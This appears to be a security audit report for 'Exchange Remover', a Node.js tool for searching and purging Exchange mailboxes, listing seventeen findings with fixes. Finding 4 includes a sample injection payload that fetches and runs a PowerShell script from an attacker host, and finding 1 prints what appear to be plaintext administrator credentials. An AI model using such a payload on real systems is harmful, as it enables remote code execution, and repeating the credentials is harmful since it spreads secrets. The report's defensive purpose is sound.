# Security Vulnerabilities Assessment - Exchange Remover

## 🔴 CRITICAL VULNERABILITIES

### 1. **Exposed Credentials in Version Control**
**Severity**: CRITICAL  
**Location**: `backend/.env`

**Issue**:
```
EWS_USERNAME=administrator@JusticeTest.local
EWS_PASSWORD=Nsajcsvsa44*
```

The `.env` file contains plaintext credentials for an **administrator account** with full Exchange access. If this file is committed to Git, credentials are permanently exposed in repository history.

**Impact**:
- Full Exchange organization compromise
- Unauthorized access to all mailboxes
- Ability to delete/modify emails across entire organization
- Lateral movement to other systems using same credentials

**Remediation**:
1. **IMMEDIATE**: Change the administrator password
2. Add `.env` to `.gitignore` (verify it's not already committed)
3. Remove from Git history if committed: `git filter-branch` or BFG Repo-Cleaner
4. Use secrets management (Azure Key Vault, AWS Secrets Manager, HashiCorp Vault)
5. Rotate credentials regularly

---

### 2. **SSL Certificate Validation Disabled**
**Severity**: CRITICAL  
**Location**: `backend/.env`, `backend/src/services/exchangeService.js`

**Issue**:
```
EWS_IGNORE_SSL=true
```
```javascript
if (config.ignoreSsl) {
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
}
```

**Impact**:
- Man-in-the-middle (MITM) attacks possible
- Credentials transmitted over unverified connections
- No protection against certificate spoofing
- Entire EWS communication vulnerable to interception

**Remediation**:
1. Install proper SSL certificates on Exchange server
2. Set `EWS_IGNORE_SSL=false` in production
3. Remove the `NODE_TLS_REJECT_UNAUTHORIZED` override
4. Use certificate pinning for additional security

---

### 3. **No Authentication on API Endpoints**
**Severity**: CRITICAL  
**Location**: `backend/src/routes/exchangeRoutes.js`, `backend/src/server.js`

**Issue**:
All API endpoints are publicly accessible without authentication:
- `/api/mailboxes` - Lists all mailboxes
- `/api/search` - Searches all mailboxes
- `/api/delete` - Deletes emails
- `/api/purge-sender` - Executes PowerShell scripts
- `/api/purge-logs` - Exposes audit logs

**Impact**:
- Anyone with network access can search/delete emails
- No audit trail of who performed actions
- Compliance violations (GDPR, HIPAA, SOX)
- Insider threats undetectable

**Remediation**:
1. Implement authentication middleware (JWT, OAuth2, SAML)
2. Add role-based access control (RBAC)
3. Require MFA for destructive operations
4. Integrate with Active Directory/Azure AD
5. Example implementation:
```javascript
const authenticate = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  // Verify token
  next();
};
app.use('/api', authenticate, exchangeRouter);
```

---

### 4. **Command Injection via PowerShell Execution**
**Severity**: CRITICAL  
**Location**: `backend/src/routes/exchangeRoutes.js`

**Issue**:
```javascript
const scriptArgs = [
  "-SenderEmail", senderEmail,
  "-SubjectEqual", subjectEqual,
  // ... user input directly in command args
];
const child = spawn("powershell.exe", scriptArgs);
```

**Impact**:
- Arbitrary PowerShell command execution
- Server compromise via malicious input
- Privilege escalation if service runs as admin
- Data exfiltration

**Attack Example**:
```
senderEmail: "test@example.com; Invoke-WebRequest http://attacker.com/steal.ps1 | iex"
```

**Remediation**:
1. Validate and sanitize ALL user inputs
2. Use parameterized script execution
3. Run PowerShell with `-NoProfile -ExecutionPolicy Restricted`
4. Implement input whitelist validation:
```javascript
const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
if (!emailRegex.test(senderEmail)) {
  throw new Error('Invalid email format');
}
```
5. Run backend service with least privilege account

---

## 🟠 HIGH SEVERITY VULNERABILITIES

### 5. **CORS Misconfiguration**
**Severity**: HIGH  
**Location**: `backend/src/server.js`

**Issue**:
```javascript
const allowedOrigins = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(",").map((origin) => origin.trim())
  : "*";  // Allows ALL origins if not configured
```

**Impact**:
- Any website can make requests to your API
- CSRF attacks possible
- Session hijacking if cookies used

**Remediation**:
1. Never use `"*"` in production
2. Explicitly whitelist only trusted origins
3. Validate origin header on every request
4. Use `credentials: true` only with specific origins

---

### 6. **Sensitive Data in Logs**
**Severity**: HIGH  
**Location**: `backend/src/services/exchangeService.js`, `backend/src/utils/logStore.js`

**Issue**:
```javascript
logger.info({ requestId: context.requestId, sender, subject, receivedFrom, receivedTo, folders }, "Search request received");
```

Logs may contain:
- Email addresses (PII)
- Email subjects (potentially sensitive)
- Search queries revealing investigation targets

**Impact**:
- GDPR/privacy violations
- Sensitive information leakage
- Compliance audit failures

**Remediation**:
1. Redact PII from logs
2. Use log levels appropriately (debug vs info)
3. Encrypt log files at rest
4. Implement log retention policies
5. Restrict log file access

---

### 7. **No Rate Limiting**
**Severity**: HIGH  
**Location**: All API endpoints

**Issue**:
No rate limiting on any endpoint allows:
- Brute force attacks
- Denial of Service (DoS)
- Resource exhaustion

**Impact**:
- API abuse
- Server crashes
- Exchange server overload
- Legitimate users blocked

**Remediation**:
```javascript
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use('/api', limiter);
```

---

### 8. **Insufficient Input Validation**
**Severity**: HIGH  
**Location**: `backend/src/routes/exchangeRoutes.js`

**Issue**:
While Joi validates structure, it doesn't prevent:
- Excessively large payloads
- Malicious regex patterns (ReDoS)
- SQL injection-like patterns in search queries

**Current validation**:
```javascript
sender: Joi.string().email({ tlds: { allow: false } })
// Allows any email format, no length limits
```

**Remediation**:
```javascript
sender: Joi.string().email().max(254).required(),
subject: Joi.string().max(256).pattern(/^[a-zA-Z0-9\s\-_.,!?]+$/),
maxPerMailbox: Joi.number().integer().min(1).max(500) // Reduce from 2000
```

---

### 9. **Unencrypted Log Storage**
**Severity**: HIGH  
**Location**: `backend/src/utils/logStore.js`

**Issue**:
```javascript
const resolvedLogFile = path.join(resolvedLogDir, "purge-actions.jsonl");
await fs.appendFile(resolvedLogFile, line, "utf8");
```

Logs stored in plaintext containing:
- Affected mailbox lists
- Sender emails
- Deletion timestamps
- Request payloads

**Remediation**:
1. Encrypt logs at rest (AES-256)
2. Use secure log aggregation service (Splunk, ELK)
3. Implement log file rotation with encryption
4. Restrict file system permissions (chmod 600)

---

## 🟡 MEDIUM SEVERITY VULNERABILITIES

### 10. **Weak Session Management**
**Severity**: MEDIUM  
**Location**: Frontend API client

**Issue**:
No session management or token refresh mechanism. If authentication is added, sessions could be hijacked.

**Remediation**:
1. Implement JWT with short expiration (15 minutes)
2. Use refresh tokens with rotation
3. Store tokens in httpOnly cookies (not localStorage)
4. Implement CSRF tokens

---

### 11. **Error Information Disclosure**
**Severity**: MEDIUM  
**Location**: `backend/src/server.js`

**Issue**:
```javascript
if (err.details) {
  response.details = err.details;
} else if (err.cause?.message && expose) {
  response.details = { cause: err.cause.message };
}
```

Detailed error messages expose:
- Internal paths
- Stack traces
- Database/EWS connection details

**Remediation**:
```javascript
const response = {
  message: expose && process.env.NODE_ENV !== 'production' 
    ? err.message 
    : "An error occurred",
  status,
  requestId: req.requestId
};
// Never send details in production
```

---

### 12. **Missing Security Headers**
**Severity**: MEDIUM  
**Location**: `backend/src/server.js`

**Issue**:
No security headers configured:
- No `X-Content-Type-Options`
- No `X-Frame-Options`
- No `Content-Security-Policy`
- No `Strict-Transport-Security`

**Remediation**:
```javascript
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"]
    }
  },
  hsts: { maxAge: 31536000, includeSubDomains: true }
}));
```

---

### 13. **Unvalidated Redirects**
**Severity**: MEDIUM  
**Location**: Frontend routing

**Issue**:
```javascript
<Route path="*" element={<Navigate to="/search" replace />} />
```

While minimal, could be exploited if query parameters are added.

**Remediation**:
Validate all redirect destinations against whitelist.

---

### 14. **Dependency Vulnerabilities**
**Severity**: MEDIUM  
**Location**: `package.json` files

**Issue**:
Using `^` (caret) ranges allows automatic minor/patch updates that may introduce vulnerabilities.

**Remediation**:
1. Run `npm audit` regularly
2. Use `npm audit fix` for automatic patches
3. Consider exact versions for production
4. Implement Dependabot or Snyk for monitoring
5. Review `ews-javascript-api` (older package, may have vulnerabilities)

---

## 🟢 LOW SEVERITY VULNERABILITIES

### 15. **Verbose Logging in Production**
**Severity**: LOW  
**Location**: `backend/src/services/exchangeService.js`

**Issue**:
Debug logs may run in production, impacting performance and exposing information.

**Remediation**:
```javascript
const logLevel = process.env.NODE_ENV === 'production' ? 'warn' : 'debug';
```

---

### 16. **No Request Size Limits**
**Severity**: LOW  
**Location**: `backend/src/server.js`

**Issue**:
```javascript
app.use(express.json({ limit: "1mb" }));
```

1MB is reasonable but could be reduced for most endpoints.

**Remediation**:
```javascript
app.use(express.json({ limit: "100kb" })); // Reduce default
app.use('/api/purge-sender', express.json({ limit: "1mb" })); // Specific routes
```

---

### 17. **Client-Side Validation Only**
**Severity**: LOW  
**Location**: Frontend forms

**Issue**:
React Hook Form validation can be bypassed by direct API calls.

**Remediation**:
Always validate on backend (already done with Joi, but ensure consistency).

---

## 📊 Vulnerability Summary

| Severity | Count | Risk Level |
|----------|-------|------------|
| 🔴 Critical | 4 | Immediate action required |
| 🟠 High | 5 | Address within 1 week |
| 🟡 Medium | 5 | Address within 1 month |
| 🟢 Low | 3 | Address as time permits |
| **TOTAL** | **17** | |

---

## 🎯 Priority Remediation Roadmap

### Week 1 (Critical)
1. ✅ Remove credentials from `.env` and Git history
2. ✅ Implement authentication/authorization
3. ✅ Fix SSL certificate validation
4. ✅ Sanitize PowerShell command inputs

### Week 2 (High)
5. ✅ Configure CORS properly
6. ✅ Implement rate limiting
7. ✅ Add input validation enhancements
8. ✅ Encrypt log storage
9. ✅ Redact PII from logs

### Month 1 (Medium)
10. ✅ Add security headers (helmet)
11. ✅ Implement session management
12. ✅ Sanitize error messages
13. ✅ Run dependency audit
14. ✅ Validate redirects

### Ongoing (Low)
15. ✅ Adjust log levels for production
16. ✅ Fine-tune request size limits
17. ✅ Regular security audits

---

## 🛡️ Security Best Practices Checklist

- [ ] **Secrets Management**: Use Azure Key Vault or similar
- [ ] **Authentication**: Implement OAuth2/SAML
- [ ] **Authorization**: Role-based access control (RBAC)
- [ ] **Encryption**: TLS 1.3 for all connections
- [ ] **Logging**: Centralized, encrypted, with retention policies
- [ ] **Monitoring**: Real-time alerts for suspicious activity
- [ ] **Backups**: Regular encrypted backups of logs and configs
- [ ] **Incident Response**: Documented procedures
- [ ] **Penetration Testing**: Annual third-party assessment
- [ ] **Code Review**: Security-focused reviews before deployment
- [ ] **Least Privilege**: Service accounts with minimal permissions
- [ ] **Network Segmentation**: Isolate backend from public internet
- [ ] **WAF**: Web Application Firewall in front of API
- [ ] **DDoS Protection**: CloudFlare or similar
- [ ] **Compliance**: GDPR, HIPAA, SOX as applicable

---

## 🚨 Immediate Actions Required

1. **STOP** committing `.env` files to Git
2. **ROTATE** all exposed credentials immediately
3. **ENABLE** SSL certificate validation
4. **IMPLEMENT** authentication before production deployment
5. **SANITIZE** all user inputs to PowerShell scripts
6. **RESTRICT** network access to backend API (VPN/firewall)
7. **AUDIT** existing logs for exposed credentials
8. **DOCUMENT** security incident response procedures

---

## 📞 Security Contact

Establish a security contact and incident response team before deploying to production.

**Recommended Tools**:
- SIEM: Splunk, ELK Stack
- Secrets: Azure Key Vault, AWS Secrets Manager
- Monitoring: Datadog, New Relic
- Scanning: Snyk, OWASP ZAP, Burp Suite
- WAF: CloudFlare, AWS WAF, Azure Front Door
